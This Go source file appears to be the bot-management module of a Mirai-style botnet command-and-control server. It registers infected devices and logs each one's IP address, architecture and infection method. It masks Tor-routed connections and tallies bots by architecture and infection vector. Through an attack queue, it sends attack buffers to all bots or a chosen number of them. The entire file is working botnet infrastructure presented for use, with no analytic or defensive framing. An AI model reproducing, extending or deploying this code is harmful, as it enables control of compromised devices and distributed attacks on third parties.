package main

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	vectViewReq chan int
	vectViewRes chan map[string]int
	cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
	go c.worker()
	go c.fastCountWorker()
	return c
}

func (this *ClientList) Count() int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	this.cntView <- 0
	return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.distViewReq <- 0
	return <-this.distViewRes
}

func (this *ClientList) VectorDistribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.vectViewReq <- 0
	return <-this.vectViewRes
}

func (this *ClientList) AddClient(c *Bot) {
	remoteAddr := c.conn.RemoteAddr().String()
	if strings.HasPrefix(remoteAddr, "127.0.0.1") {
		remoteAddr = "[Tor Traffic]"
	}
	this.addQueue <- c
	fmt.Printf("\033[1;37m[Device] \033[0;32mInfected \033[1;37m| IP Address:\033[0;32m %s (%s - %s)\n", remoteAddr, c.arch, c.infectionMethod)
}

func (this *ClientList) DelClient(c *Bot) {
	remoteAddr := c.conn.RemoteAddr().String()
	if strings.HasPrefix(remoteAddr, "127.0.0.1") {
		remoteAddr = "[Tor Traffic]"
	}
	this.delQueue <- c
	fmt.Printf("\033[1;37m[Device] \033[0;31mDisconnected \033[1;37m| IP Address:\033[0;32m %s (%s)\n", remoteAddr, c.arch)
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-this.totalCount:
			this.count += delta
			if this.count < 0 {
				this.count = 0
			}
			break
		case <-this.cntView:
			this.cntView <- this.count
			break
		}
	}
}

func (this *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-this.addQueue:
			// Deduplication: Close existing connection with the same Bot ID
			for uid, client := range this.clients {
				if client.id == add.id {
					client.conn.Close()
					delete(this.clients, uid)
					this.totalCount <- -1
					break
				}
			}
			this.totalCount <- 1
			this.uid++
			add.uid = this.uid
			this.clients[add.uid] = add
			break
		case del := <-this.delQueue:
			if _, ok := this.clients[del.uid]; ok {
				this.totalCount <- -1
				delete(this.clients, del.uid)
			}
			break
		case atk := <-this.atkQueue:
			if atk.count == -1 {
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.arch {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.arch {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			break

		case <-this.distViewReq:
			res := make(map[string]int)
			for _, v := range this.clients {
				if ok, _ := res[v.arch]; ok > 0 {
					res[v.arch]++
				} else {
					res[v.arch] = 1
				}
			}
			this.distViewRes <- res
		case <-this.vectViewReq:
			res := make(map[string]int)
			for _, v := range this.clients {
				if v.infectionMethod == "" {
					res["unknown"]++
				} else {
					res[v.infectionMethod]++
				}
			}
			this.vectViewRes <- res
		}
	}
}
